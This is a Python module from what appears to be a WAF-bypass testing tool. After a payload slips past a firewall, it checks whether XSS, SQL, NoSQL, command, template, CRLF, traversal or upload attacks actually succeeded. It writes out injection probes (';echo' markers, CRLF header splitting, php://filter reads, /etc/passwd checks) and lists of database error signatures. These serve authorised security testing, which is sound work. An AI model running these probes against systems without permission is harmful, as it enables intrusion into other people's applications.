"""Class-specific semantic verification of THROUGH payloads.

The search engine's oracle only answers "did this get past the WAF?" (BLOCKED /
THROUGH / DOWN). A THROUGH verdict proves the mutated payload reached the
origin — it does NOT prove the underlying vulnerability actually fired. A WAF
bypass that reaches the app but gets neutralized there (escaped, parameterized,
sandboxed, etc.) is a false positive for "exploitable".

Each `_check_*` function below sends one or two extra, carefully-crafted
requests through the same `Oracle` used by the rest of the toolchain and
inspects the *response body* for class-specific evidence that the exploit
actually executed. These are heuristics, not proof — `Verification.reason`
says plainly what was (and wasn't) actually confirmed, and `confidence` is a
float in [0, 1] reflecting how strong that evidence is.
"""
from __future__ import annotations

import base64
import json as _json
import re
import random
import secrets
import subprocess
import urllib.parse
from dataclasses import dataclass

from ..core.oracle import apply_auth


@dataclass
class Verification:
    exploitable: bool
    confidence: float
    reason: str
    attack_class: str


def _send(oracle, payload: str, retries: int = 2):
    """Send a verification probe, retrying briefly on a transient DOWN.

    Verification issues only 1-2 high-value requests per finding; if one of them
    transiently fails (DOWN: timeout / 000 / 502), a naive checker reads the empty
    body as 'exploit not confirmed' — a FALSE NEGATIVE that silently discards a real
    bypass. A couple of quick retries on DOWN (the oracle already backs off between
    sends) turns a flaky transport back into a decisive verdict."""
    resp = oracle.send(payload)
    attempts = 0
    while getattr(resp, "verdict", "") == "DOWN" and attempts < retries:
        attempts += 1
        resp = oracle.send(payload)
    return resp


# ---------------------------------------------------------------------------
# XSS Injection
# ---------------------------------------------------------------------------
_TAG_PATTERN = re.compile(r"<\s*(script|img|svg|iframe|body|details)\b", re.I)
_EVENT_PATTERN = re.compile(r"on[a-z]+\s*=", re.I)


def _check_xss(oracle, payload: str, attack_class: str) -> Verification:
    """Reflected-XSS heuristic.

    Confirms the payload reflects verbatim (not HTML-entity-encoded) in the
    response body, and that it still carries an executable-context marker
    (a tag like <script>/<svg>, or an on*= event handler, or javascript:).
    A verbatim-but-encoded reflection (&lt;script&gt;) is explicitly treated
    as NOT exploitable — that's exactly the "got through as garbage" case
    this verifier exists to catch.
    """
    resp = _send(oracle, payload)
    body = resp.body or ""
    if not body:
        return Verification(False, 0.1, "empty response body; cannot confirm reflection", attack_class)

    body_l = body.lower()
    reflected_raw = payload.lower() in body_l
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    reflected_escaped = escaped.lower() in body_l and escaped != payload

    if reflected_escaped and not reflected_raw:
        return Verification(False, 0.85,
                             "payload reflected but HTML-entity encoded — not executable", attack_class)

    if reflected_raw:
        if _TAG_PATTERN.search(body) or _EVENT_PATTERN.search(body) or "javascript:" in body_l:
            return Verification(True, 0.85,
                                 "payload reflected verbatim with an unescaped executable-context marker"
                                 " (tag/event-handler/javascript:)", attack_class)
        return Verification(True, 0.5,
                             "payload reflected verbatim, but no distinct executable marker found "
                             "near it — likely exploitable but unconfirmed context", attack_class)

    return Verification(False, 0.3, "payload not found reflected anywhere in the response body", attack_class)


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------
_SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql", r"warning:\s*mysql_", r"mysql_fetch_array",
    r"ora-\d{5}", r"postgresql.*error", r"pg_query\(\)", r"sqlite3::",
    r"unclosed quotation mark", r"microsoft ole db provider for sql server",
    r"sqlstate\[", r"you have an error in your sql syntax",
    # SQLite / Sequelize (Node ORMs, e.g. OWASP Juice Shop) — the literal engine
    # error string ("SQLITE_ERROR: near \"...\": syntax error") and ORM wrappers.
    r"sqlite_error", r"sqlite3?[._]\w*error", r"unrecognized token",
    r"sequelize\w*error", r"\bsequelize\b",
]


def _flip_boolean(payload: str) -> str | None:
    """Best-effort: turn a true-ish boolean payload into its false counterpart."""
    pairs = [
        ("1=1", "1=2"), ("'1'='1'", "'1'='2'"), ("'1'='1", "'1'='2"),
        ("1=='1'", "1=='2'"), ("or 1=1", "or 1=2"), ("OR 1=1", "OR 1=2"),
    ]
    for true_tok, false_tok in pairs:
        if true_tok in payload:
            return payload.replace(true_tok, false_tok)
    return None


def _check_sqli(oracle, payload: str, attack_class: str) -> Verification:
    """Error-based or boolean-differential heuristic.

    First looks for a verbatim DB error signature in the response (strong,
    direct evidence the DB parsed the injected syntax). Failing that, it
    flips the boolean sense of the payload (1=1 -> 1=2, etc.) and compares
    the two responses: a meaningful size/body differential between the
    "true" and "false" variants is evidence of a working boolean-blind SQLi.
    """
    resp_true = _send(oracle, payload)
    body = resp_true.body or ""
    for pat in _SQL_ERROR_PATTERNS:
        if re.search(pat, body, re.I):
            return Verification(True, 0.8, f"database error signature matched in response ({pat!r})",
                                 attack_class)

    false_variant = _flip_boolean(payload)
    if false_variant is None or false_variant == payload:
        return Verification(False, 0.2,
                             "no SQL error signature found, and payload has no recognizable boolean "
                             "clause to differential-test", attack_class)

    resp_false = _send(oracle, false_variant)
    if resp_true.body == resp_false.body:
        return Verification(False, 0.4,
                             "true/false variants produced byte-identical responses; "
                             "no boolean differential observed", attack_class)

    denom = max(resp_true.size, resp_false.size, 1)
    size_delta_ratio = abs(resp_true.size - resp_false.size) / denom
    if resp_true.verdict == "THROUGH" and size_delta_ratio > 0.02:
        return Verification(True, 0.7,
                             f"boolean differential: true-variant size={resp_true.size} vs "
                             f"false-variant size={resp_false.size} (Δ={size_delta_ratio:.1%})",
                             attack_class)

    return Verification(False, 0.3,
                         "true/false variants differ slightly but not enough to confirm a boolean "
                         "differential", attack_class)


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------
_CMD_WORDS = ["uname -a", "cat /etc/passwd", "whoami", "ls -la", "ls", "id"]


def _check_cmdi(oracle, payload: str, attack_class: str) -> Verification:
    """Benign echo-marker technique.

    Swaps the command word in the payload for `echo <unique-token>` (preserving
    whatever separator/injection syntax the bypass found — ;, |, &&, $(), ``).
    If the token comes back verbatim in the response body, the shell actually
    executed our injected command — direct proof of command execution, with no
    destructive side effects.
    """
    token = f"wfx{random.randint(100000, 999999)}"
    variant = None
    for word in _CMD_WORDS:
        if word in payload:
            variant = payload.replace(word, f"echo {token}")
            break
    if variant is None:
        # no recognizable command word — append a benign echo using the
        # payload's own injection syntax, best-effort.
        variant = payload + f";echo {token}"

    resp = _send(oracle, variant)
    body = resp.body or ""
    if token in body:
        return Verification(True, 0.85,
                             f"injected echo marker '{token}' appeared verbatim in response body "
                             "— command execution confirmed", attack_class)
    return Verification(False, 0.3,
                         "echo-marker probe did not appear in the response; command execution "
                         "not confirmed (THROUGH may just mean the WAF let inert text past)",
                         attack_class)


# ---------------------------------------------------------------------------
# Directory Traversal / File Inclusion
# ---------------------------------------------------------------------------
_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.I)
_WININI_MARKERS = ("[boot loader]", "for 16-bit app support")
_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


def _check_traversal(oracle, payload: str, attack_class: str) -> Verification:
    """Looks for known file-disclosure content in the response body.

    Covers the classic /etc/passwd signature, a Windows win.ini signature, and
    the php://filter/convert.base64-encode trick (decodes long base64 blobs in
    the body and checks whether any of them is actually PHP source).
    """
    resp = _send(oracle, payload)
    body = resp.body or ""

    if _PASSWD_RE.search(body):
        return Verification(True, 0.9, "/etc/passwd signature ('root:...:0:0:') found in response body",
                             attack_class)

    if any(m in body.lower() for m in _WININI_MARKERS):
        return Verification(True, 0.8, "win.ini signature found in response body", attack_class)

    if "php://filter" in payload.lower():
        for m in _B64_BLOB_RE.finditer(body):
            blob = m.group(0)
            padded = blob + "=" * (-len(blob) % 4)
            try:
                decoded = base64.b64decode(padded, validate=False).decode("utf-8", errors="ignore")
            except Exception:
                continue
            if "<?php" in decoded.lower() or "<?=" in decoded:
                return Verification(True, 0.85,
                                     "base64 blob in response decodes to PHP source — "
                                     "php://filter wrapper confirmed working", attack_class)

    return Verification(False, 0.25,
                         "no known file-disclosure signature (/etc/passwd, win.ini, decoded PHP "
                         "source) found in the response body", attack_class)


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------
_SSTI_SYNTAXES = [
    (re.compile(r"\{\{.*?\}\}"), lambda a, b: f"{{{{{a}*{b}}}}}"),
    (re.compile(r"\$\{.*?\}"), lambda a, b: f"${{{a}*{b}}}"),
    (re.compile(r"<%=.*?%>"), lambda a, b: f"<%= {a}*{b} %>"),
    (re.compile(r"#\{.*?\}"), lambda a, b: f"#{{{a}*{b}}}"),
]


def _check_ssti(oracle, payload: str, attack_class: str) -> Verification:
    """Arithmetic-marker technique.

    Rewrites the template expression in the payload to multiply two random
    3-digit numbers and checks whether their (otherwise astronomically
    unlikely to appear by chance) product shows up in the response — proof
    the template engine actually evaluated our expression server-side.
    """
    a, b = random.randint(100, 199), random.randint(100, 199)
    product = a * b

    variant = None
    for pattern, build in _SSTI_SYNTAXES:
        if pattern.search(payload):
            variant = pattern.sub(build(a, b), payload, count=1)
            break
    if variant is None:
        variant = f"{{{{{a}*{b}}}}}"

    resp = _send(oracle, variant)
    body = resp.body or ""
    if str(product) in body:
        return Verification(True, 0.9,
                             f"arithmetic marker {a}*{b}={product} was evaluated and appeared in the "
                             "response — template evaluation confirmed", attack_class)
    return Verification(False, 0.3,
                         f"arithmetic marker {a}*{b}={product} did not appear in the response; "
                         "template evaluation not confirmed", attack_class)


# ---------------------------------------------------------------------------
# CRLF Injection
# ---------------------------------------------------------------------------
_CRLF_MARKER_NAME = "X-Waffen-CRLF"


def _fetch_headers(target, payload: str, timeout: int | None = None) -> str:
    """Self-contained `curl -i` header fetch.

    `Oracle.send()` only returns code/size/time/body — no headers — because
    the rest of the toolchain never needs them. CRLF/response-splitting
    verification is the exception: the only way to *prove* a CRLF payload
    split the response is to look at the raw header block. Rather than
    changing `Response` (out of scope — other files are off limits), this
    builds its own curl invocation with `-i` so headers are included in the
    output, using the same per-inject-point request shapes as
    `Oracle._build` (query/path/rawpath/body/json/header/cookie).

    Returns the raw header text (everything before the first blank line),
    or "" on any failure — callers must treat that as "headers unavailable"
    and fall back to a body-based check, not as "no CRLF".
    """
    try:
        t = target
        to = timeout or getattr(t, "timeout", 15)
        method = getattr(t, "method", "GET")
        param = getattr(t, "param", "q")
        inject = getattr(t, "inject", "query")
        url = t.base_url.rstrip("/") + t.path

        sec = t.curl_sec(with_i=True) if hasattr(t, "curl_sec") else "-sik"
        cmd = ["curl", sec, "-m", str(to), "-A", getattr(t, "user_agent", "WAFFEN/0.1")]
        if inject == "query":
            qp = urllib.parse.urlencode({param: payload})
            sep = "&" if "?" in url else "?"
            cmd += ["-X", method, f"{url}{sep}{qp}"]
        elif inject == "path":
            cmd += ["-X", method, f"{url}/{urllib.parse.quote(payload, safe='')}"]
        elif inject == "rawpath":
            enc = urllib.parse.quote(payload, safe="/.-_~")
            cmd += ["-X", method, f"{url.rstrip('/')}/{enc.lstrip('/')}"]
        elif inject == "body":
            cmd += ["-X", method, url, "-H", "Content-Type: application/x-www-form-urlencoded",
                    "--data-urlencode", f"{param}={payload}"]
        elif inject == "json":
            cmd += ["-X", method, url, "-H", "Content-Type: application/json",
                    "-d", _json.dumps({param: payload})]
        elif inject == "header":
            cmd += ["-X", method, url, "-H", f"{param}: {payload}"]
        elif inject == "cookie":
            cmd += ["-X", method, url, "-H", f"Cookie: {param}={payload}"]
        else:
            cmd += ["-X", method, url]

        cmd = apply_auth(cmd, t)  # thread --header/--cookie so CRLF verify works behind auth
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=to + 5).stdout
        for sep in ("\r\n\r\n", "\n\n"):
            if sep in out:
                return out.split(sep, 1)[0]
        return out
    except Exception:
        return ""


def _check_crlf(oracle, payload: str, attack_class: str) -> Verification:
    """CRLF-injection / HTTP response-splitting heuristic.

    The search engine hands us a payload that already got THROUGH carrying a
    CRLF sequence (raw `\\r\\n`, `%0d%0a`, `%0a`, etc.) — but a THROUGH verdict
    only means the WAF didn't block it, not that the backend actually honored
    the injected line break. To confirm, we append an attacker-controlled,
    unique marker header (`X-Waffen-CRLF: <random-token>`) onto the payload
    using both a URL-encoded CRLF (`%0d%0a...`) and a raw `\\r\\n...` variant,
    then look for it in two places:

      1. The response HEADERS (fetched via `_fetch_headers`, a dedicated
         curl -i call) — if our marker shows up as its own header line, the
         CRLF sequence split the HTTP response and injected a real header.
         That's direct, strong proof of response splitting (confidence 0.85).
      2. Failing that (headers unavailable, or marker not there), the
         response BODY from the normal oracle transport — if the raw marker
         token shows up there, the CR/LF bytes survived whatever sanitization
         happened, but we can't prove it actually split the response into a
         new header, so this is treated as a weaker signal (confidence 0.4).

    Neither signal present -> not confirmed.
    """
    token = f"wfxcrlf{secrets.token_hex(8)}"  # CSPRNG marker — unpredictable
    needle = f"{_CRLF_MARKER_NAME.lower()}: {token}".lower()
    variants = [
        payload + f"%0d%0a{_CRLF_MARKER_NAME}: {token}",
        payload + f"\r\n{_CRLF_MARKER_NAME}: {token}",
    ]

    for variant in variants:
        headers = _fetch_headers(oracle.t, variant)
        if headers and needle in headers.lower():
            return Verification(True, 0.85,
                                 f"injected marker header '{_CRLF_MARKER_NAME}: {token}' appeared "
                                 "verbatim in the response HEADERS — CRLF response-splitting "
                                 "confirmed", attack_class)

    for variant in variants:
        resp = _send(oracle, variant)
        body = resp.body or ""
        if token in body:
            return Verification(True, 0.4,
                                 f"injected marker token '{token}' reflected in the response BODY "
                                 "only — the CR/LF bytes passed through, but no confirmed header "
                                 "split was observed (response headers unavailable or unaffected)",
                                 attack_class)

    return Verification(False, 0.2,
                         "neither response headers nor body show the injected CRLF marker "
                         f"('{_CRLF_MARKER_NAME}: {token}') — CRLF injection not confirmed",
                         attack_class)


# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------
_NOSQL_ERROR_PATTERNS = [
    r"mongo\w*\s*(error|exception)", r"mongoerror", r"\be11000\b", r"\bbson\b",
    r"cast to objectid failed", r"unknown operator", r"\$where", r"unexpected token .*in json",
    r"couchdb", r"redis.*wrong number", r"unterminated string",
]


def _flip_nosql(payload: str) -> str | None:
    """Best-effort: turn an always-true NoSQL clause into an always-false one."""
    pairs = [
        ("[$ne]=1", "[$eq]=1"), ("[$ne]=", "[$eq]="), ("$ne", "$eq"),
        ("[$gt]=", "[$lt]="), ("'1'=='1'", "'1'=='2'"), ("1==1", "1==2"),
        ("||'1'=='1", "||'1'=='2"), ("' || '1'=='1", "' || '1'=='2"), ("true", "false"),
    ]
    for true_tok, false_tok in pairs:
        if true_tok in payload:
            return payload.replace(true_tok, false_tok, 1)
    return None


def _check_nosql(oracle, payload: str, attack_class: str) -> Verification:
    """NoSQL error-based or boolean-differential heuristic (mirrors _check_sqli).

    Looks first for a NoSQL engine error signature (Mongo/BSON/Couch/Redis), then
    flips an always-true operator clause ([$ne]->[$eq], ' || '1'=='1 -> ...'2', ...)
    and compares the true vs false responses: a meaningful size/body differential
    is evidence the injected operator actually changed the query's result set."""
    resp_true = _send(oracle, payload)
    body = resp_true.body or ""
    for pat in _NOSQL_ERROR_PATTERNS:
        if re.search(pat, body, re.I):
            return Verification(True, 0.7, f"NoSQL engine error signature matched in response ({pat!r})",
                                 attack_class)

    false_variant = _flip_nosql(payload)
    if false_variant is None or false_variant == payload:
        return Verification(False, 0.2,
                             "no NoSQL error signature, and payload has no recognizable always-true "
                             "clause to differential-test", attack_class)

    resp_false = _send(oracle, false_variant)
    if resp_true.body == resp_false.body:
        return Verification(False, 0.4,
                             "true/false NoSQL variants produced byte-identical responses; "
                             "no differential observed", attack_class)
    denom = max(resp_true.size, resp_false.size, 1)
    delta = abs(resp_true.size - resp_false.size) / denom
    if resp_true.verdict == "THROUGH" and delta > 0.02:
        return Verification(True, 0.65,
                             f"NoSQL boolean differential: true-variant size={resp_true.size} vs "
                             f"false-variant size={resp_false.size} (Δ={delta:.1%})", attack_class)
    return Verification(False, 0.3,
                         "true/false NoSQL variants differ slightly but not enough to confirm", attack_class)


# ---------------------------------------------------------------------------
# Upload Insecure Files
# ---------------------------------------------------------------------------
_UPLOAD_REJECT_RE = re.compile(
    r"(not allowed|invalid file|forbidden|illegal|unsupported|disallowed|"
    r"bad extension|file type not|not permitted|blocked|rejected|"
    r"only .{0,24}(jpg|jpeg|png|gif|pdf|image)s? (are )?(allowed|permitted|accepted))", re.I)


def _check_upload(oracle, payload: str, attack_class: str) -> Verification:
    """Insecure-file-upload heuristic.

    `payload` is the uploaded FILENAME the search got past the WAF (shell.phtml,
    'shell.php;.jpg', 'shell.php%00.jpg', ...). A THROUGH verdict only means the WAF
    did not block the multipart request — NOT that the application accepted the
    dangerous file. The oracle (inject=upload) re-sends the upload with an inert,
    marked probe file under that filename; we read the app's own reaction:

      - an explicit extension/type rejection  -> NOT exploitable (the app defends
        itself even though the WAF passed the request);
      - acceptance (2xx / THROUGH, no rejection text) -> the dangerous extension got
        in past BOTH the WAF and the app's own checks (confidence 0.55). We stop at
        'accepted': proving the file is then served/executed is app-specific and the
        probe content is deliberately inert (a marker, never a working shell).
    """
    resp = _send(oracle, payload)
    body = resp.body or ""
    if resp.verdict == "DOWN":
        return Verification(False, 0.2, "upload probe failed (transport DOWN); acceptance not confirmed",
                             attack_class)
    if _UPLOAD_REJECT_RE.search(body):
        return Verification(False, 0.6,
                             f"app rejected the dangerous upload '{payload}' — extension/type filtered at "
                             "the app layer (WAF let it pass, but the app defends itself)", attack_class)
    if resp.verdict == "THROUGH" and resp.code[:1] == "2":
        return Verification(True, 0.55,
                             f"app accepted the dangerous upload '{payload}' (HTTP {resp.code}, no extension "
                             "rejection) — it passed BOTH the WAF and the app; serving/execution not probed",
                             attack_class)
    return Verification(False, 0.3,
                         f"upload '{payload}' passed the WAF but the app's acceptance is unconfirmed "
                         f"(HTTP {resp.code or '?'}, no success or rejection signal)", attack_class)


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------
_CHECKS = {
    "XSS Injection": _check_xss,
    "SQL Injection": _check_sqli,
    "Command Injection": _check_cmdi,
    "Directory Traversal": _check_traversal,
    "File Inclusion": _check_traversal,
    "SSTI": _check_ssti,
    "CRLF Injection": _check_crlf,
    "NoSQL Injection": _check_nosql,
    "Upload Insecure Files": _check_upload,
}


def verify(oracle, payload: str, attack_class: str) -> Verification:
    """Best-effort semantic verification that `payload` really exercises
    `attack_class`'s vulnerability, not just that it got a THROUGH verdict.

    Sends 1-2 extra requests via the same `oracle` (an `Oracle` instance from
    waffen.core.oracle) and inspects response bodies for class-specific
    evidence. Never raises — a checker failure degrades to a low-confidence
    Verification rather than crashing the caller.
    """
    checker = _CHECKS.get(attack_class)
    if checker is None:
        return Verification(False, 0.0, "no verifier for class", attack_class)
    try:
        return checker(oracle, payload, attack_class)
    except Exception as exc:  # defensive: verification must never crash the run
        return Verification(False, 0.0, f"verifier raised an exception: {exc!r}", attack_class)
